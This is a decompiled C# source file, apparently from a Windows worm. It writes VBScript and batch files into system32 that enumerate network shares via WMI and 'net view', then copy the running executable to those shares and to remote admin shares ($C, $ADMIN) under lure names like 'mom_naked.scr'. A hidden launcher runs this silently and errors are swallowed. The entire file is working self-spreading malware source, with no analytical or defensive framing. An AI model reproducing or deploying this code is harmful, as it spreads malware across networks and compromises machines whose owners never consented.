using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace ns1;

[StandardModule]
internal sealed class Class9
{
	public static void smethod_0()
	{
		try
		{
			FileStream stream = new FileStream("C:\\windows\\system32\\net.vbs", FileMode.Create, FileAccess.Write);
			StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.BaseStream.Seek(0L, SeekOrigin.End);
			streamWriter.WriteLine("strComputer =\".\"");
			streamWriter.WriteLine("Set objWMIService = GetObject(\"winmgmts:\"_ ");
			streamWriter.WriteLine("& \"{impersonationLevel=impersonate}!\\\\\" & strComputer & \"\\root\\cimv2\")");
			streamWriter.WriteLine("Set colShares = objWMIService.ExecQuery(\"Select * from Win32_Share\")");
			streamWriter.WriteLine("For each objShare in colShares ");
			streamWriter.WriteLine("Stuff = objShare.Path ");
			streamWriter.WriteLine("Set myFSO = CreateObject(\"Scripting.FileSystemObject\") ");
			streamWriter.WriteLine("Set WriteStuff = myFSO.OpenTextFile(\"C:\\windows\\system32\\logg.txt\", 8, True)");
			streamWriter.WriteLine("WriteStuff.WriteLine(Stuff) ");
			streamWriter.WriteLine("WriteStuff.Close ");
			streamWriter.WriteLine("SET WriteStuff = NOTHING ");
			streamWriter.WriteLine("Next ");
			streamWriter.Close();
			FileStream stream2 = new FileStream("C:\\windows\\system32\\net.bat", FileMode.Create, FileAccess.Write);
			StreamWriter streamWriter2 = new StreamWriter(stream2);
			streamWriter2.BaseStream.Seek(0L, SeekOrigin.End);
			streamWriter2.WriteLine("for /f \"delims=\" %%t in (C:\\windows\\system32\\logg.txt) do (");
			streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %%t\\mom_naked.scr");
			streamWriter2.WriteLine(")");
			streamWriter2.WriteLine("net view >logidylog.txt");
			streamWriter2.WriteLine("for /f \"delims=\" %%o in (logidylog.txt) do (");
			streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %%o\\$IPC\\mom_naked.scr");
			streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %%o\\$C\\mom_naked.scr");
			streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %%o\\$D\\mom_naked.scr");
			streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %%o\\$ADMIN\\mom_naked.scr");
			streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %%o\\$winnt\\mom_naked.scr");
			streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %%o\\$print\\mom_naked.scr");
			streamWriter2.WriteLine("net view %%o >logi.txt");
			streamWriter2.WriteLine("for /f %%m in (logi.txt) do (");
			streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " \\\\%%o\\%%m\\sex_with_pamela_anderson_%random%.scr");
			streamWriter2.WriteLine(")");
			streamWriter2.WriteLine(")");
			streamWriter2.Close();
			Process.Start("C:\\windows\\system32\\net.vbs");
			FileStream stream3 = new FileStream("C:\\windows\\system32\\launch.vbs", FileMode.Create, FileAccess.Write);
			StreamWriter streamWriter3 = new StreamWriter(stream3);
			streamWriter3.BaseStream.Seek(0L, SeekOrigin.End);
			streamWriter3.WriteLine("Dim oShell");
			streamWriter3.WriteLine("Set oShell = WScript.CreateObject (\"WScript.Shell\")");
			streamWriter3.WriteLine("oShell.run \"C:\\windows\\system32\\net.bat\",0,True");
			streamWriter3.WriteLine("Set oShell = Nothing ");
			streamWriter3.Close();
			Process.Start("C:\\windows\\system32\\launch.vbs");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
